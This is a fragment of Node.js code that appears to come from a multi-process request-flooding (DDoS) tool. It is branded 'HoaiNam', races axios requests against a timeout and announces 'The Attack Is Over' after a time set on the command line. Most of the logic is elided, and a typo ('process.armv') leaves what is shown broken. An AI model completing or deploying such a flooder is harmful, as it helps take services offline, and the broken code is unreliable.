  ...
  Promise.race([axiosPromise, timeoutPromise])
    ...
    .catch((error) => {
      if (error.message === 'Request timed out') {
        ...
        console.log(`[\x1b[35mHoaiNam\x1b[0m] ${error.message}`);
      }
    });
}
...
if (cluster.isMaster){
  console.clear();
  console.log(`[${getCurrentTime()} - \x1b[35mHoaiNam\x1b[0m]`);
  ...
  setTimeout(() => {
    console.log(`[\x1b[35mHoaiNam\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.armv[3] * 1000);
} 
